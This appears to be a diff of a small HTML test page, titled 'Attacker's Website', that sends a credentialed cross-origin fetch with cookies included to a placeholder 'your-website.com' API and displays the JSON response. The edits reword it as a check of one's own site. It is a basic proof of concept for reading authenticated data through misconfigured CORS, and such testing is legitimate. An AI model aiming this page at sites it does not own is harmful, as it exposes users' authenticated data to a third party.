@@ -3,27 +3,33 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Malicious Website Test</title>
+    <title>Attacker's Website</title>
 </head>
 <body>
     <h1>Malicious Website</h1>
-    <button id="sendRequest">Send Request to Target Server</button>
+    <button id="sendRequest">Send Request to Your Website</button>
+
+    <h2>Response Data from Your Website:</h2>
+    <pre id="responseData"></pre>  <!-- This is where we'll show the response data -->
 
     <script>
         document.getElementById('sendRequest').addEventListener('click', function() {
-            fetch('https://yourwebsite.com/api/target-endpoint', {
-                method: 'POST',
+            // Send a request to your real website
+            fetch('https://your-website.com/api/endpoint', {
+                method: 'POST', // You can change this to GET if you want
                 headers: {
                     'Content-Type': 'application/json',
                 },
                 body: JSON.stringify({
-                    key: 'value',  // Replace this with the actual data you're trying to exploit
+                    key: 'value',  // You can send any data here if needed
                 }),
-                credentials: 'include'  // This sends cookies if 'Access-Control-Allow-Credentials' is true
+                credentials: 'include'  // This allows cookies and authentication info to be sent
             })
-            .then(response => response.json())
+            .then(response => response.json())  // Assuming your website sends JSON data
             .then(data => {
-                console.log('Response from the server:', data);
+                // Show the response data from your real website
+                console.log('Response from your website:', data);
+                document.getElementById('responseData').textContent = JSON.stringify(data, null, 2);
             })
             .catch(error => {
                 console.error('Error:', error);
